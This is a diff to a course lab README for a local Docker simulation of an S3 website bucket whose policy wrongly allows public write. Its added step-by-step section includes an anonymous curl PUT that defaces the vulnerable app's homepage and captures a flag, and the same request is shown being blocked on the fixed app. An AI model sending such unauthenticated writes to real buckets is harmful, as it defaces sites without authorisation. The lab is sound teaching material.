@@ -14,7 +14,7 @@ public-write, principle of least privilege on a resource-based policy, event-dri
    still where you learn the actual AWS console UI, S3 bucket creation, and SNS topic wiring).
 2. **This add-on lab (45–60 min)** — a local, from-scratch simulation of the S3 static-website
    bucket-policy concept: a tiny "S3 website endpoint"-like API you can inspect and attack
-   without an AWS account. Kickoff: `docker compose up -d`.
+   without an AWS account. Follow **Step-by-step** below (kickoff: `docker compose up -d --build`).
 3. **Submit** — worksheet + flag → see [SUBMISSION.md](../../SUBMISSION.md).
 
 ## Background — the two bugs this lab is and isn't about
@@ -55,6 +55,68 @@ is supposed to be public; public write is the mistake.
    empirical proof that the fix removes only the *extra*, unintended grantee (public write); it
    does not touch the legitimate, intended grantee (public read).
 
+## Step-by-step (copy these commands)
+Run these in a terminal inside this lab folder: Terminal on macOS or Linux, or **Git Bash** on
+Windows (it comes with Git). Each step says what you should see. Do them in order: the attack in
+step 4 really overwrites the vulnerable app's homepage, so read the original page first.
+
+0. **Your personal flag:** save the `.env` file from your Classroom private comment in this folder
+   first (see "Your personal flag" below). Without it you capture the shared placeholder flag,
+   which earns no marks.
+1. **Start both apps.** The first run downloads and builds the image, so it can take a few
+   minutes.
+   ```bash
+   docker compose up -d --build
+   ```
+   When it finishes, wait about 10 seconds for the apps to start.
+2. **Check that both apps are running.** If you see only `HTTP 000`, the apps are still starting:
+   wait a few seconds and run the command again.
+   ```bash
+   curl -s -w 'HTTP %{http_code}\n' http://localhost:8105/ping
+   curl -s -w 'HTTP %{http_code}\n' http://localhost:8106/ping
+   ```
+   You should see `{"mode":"vulnerable","status":"ok"}` and then `{"mode":"fixed","status":"ok"}`,
+   each followed by `HTTP 200`.
+3. **Normal use: read the homepage with no credentials**, on both apps.
+   ```bash
+   curl -s -w 'HTTP %{http_code}\n' http://localhost:8105/bucket/website/index.html
+   curl -s -w 'HTTP %{http_code}\n' http://localhost:8106/bucket/website/index.html
+   ```
+   Both should show `"content":"<html><body><h1>Welcome to our official site</h1></body></html>"`
+   and `HTTP 200`. Public read works the same on both apps, as a website should.
+4. **The attack:** overwrite the vulnerable app's homepage. The command sends no `Authorization`
+   header and no credentials of any kind.
+   ```bash
+   curl -s -w 'HTTP %{http_code}\n' -X PUT http://localhost:8105/bucket/website/index.html -H 'Content-Type: application/json' -d '{"content": "<html><body><h1>PWNED by anonymous PUT</h1></body></html>"}'
+   ```
+   You should see `"status":"uploaded"`, `"flag":"FLAG{...}"` and `HTTP 200`. That flag is yours:
+   copy it into the worksheet, together with the whole `curl` command you sent.
+5. **See that the site really changed:** read the vulnerable app's homepage again.
+   ```bash
+   curl -s -w 'HTTP %{http_code}\n' http://localhost:8105/bucket/website/index.html
+   ```
+   You should now see `PWNED by anonymous PUT` instead of `Welcome to our official site`. Anyone
+   who opens the site would see the attacker's page.
+6. **The same attack on the fixed app:**
+   ```bash
+   curl -s -w 'HTTP %{http_code}\n' -X PUT http://localhost:8106/bucket/website/index.html -H 'Content-Type: application/json' -d '{"content": "<html><body><h1>PWNED by anonymous PUT</h1></body></html>"}'
+   ```
+   You should see `{"error":"AccessDenied","key":"index.html"}` and `HTTP 403`, with no flag.
+7. **Public read still works on the fixed app:**
+   ```bash
+   curl -s -w 'HTTP %{http_code}\n' http://localhost:8106/bucket/website/index.html
+   ```
+   You should still see `Welcome to our official site` and `HTTP 200`. The fix blocked public
+   write but kept public read.
+8. **Stop the apps when you finish.**
+   ```bash
+   docker compose down
+   ```
+
+To start again with the original homepage, run `docker compose restart vulnerable` (the bucket
+lives in the app's memory, so a restart resets it). If a step doesn't match, check that Docker
+Desktop is running and that you are in this lab folder, then ask in class.
+
 ## Run it
 ```bash
 cd {{ labpath }}
@@ -62,11 +124,15 @@ docker compose up -d --build   # vulnerable_app.py on :8105, fixed_app.py on :81
 python3 -m pip install requests           # once, on the host
 python3 exploit.py
 ```
-Expect two `PASS` lines and exit `0`: an anonymous defacement + flag on `:8105`, a rejected
-anonymous write (no flag) on `:8106`, with public GET succeeding on both.
+`exploit.py` runs the same checks in one go (an optional self-check, not a replacement for the
+steps above). Expect two `PASS` lines and exit `0`: an anonymous defacement + flag on `:8105`, a
+rejected anonymous write (no flag) on `:8106`, with public GET succeeding on both.
 
-**Verified:** `docker compose up -d --build` was run on this machine; `exploit.py` ran from the
-host against the published ports. Real captured output:
+**Verified (2026-11-02):** `docker compose up -d --build` was run on this machine, every command
+in Step-by-step was run as written (Step 0 was tested with a stand-in `.env`, and the captured flag
+changed to its value; `docker compose restart vulnerable` restored the original homepage), and
+`exploit.py` ran from the host against the published ports. Real captured output of `exploit.py`,
+flag value masked:
 ```
 === VULNERABLE (bucket policy grants Principal:'*' both Get+PutObject) (http://localhost:8105) ===
 [*] anonymous GET index.html (public website hosting) -> 200 {'content': '<html><body><h1>Welcome to our official site</h1></body></html>', 'key': 'index.html'}
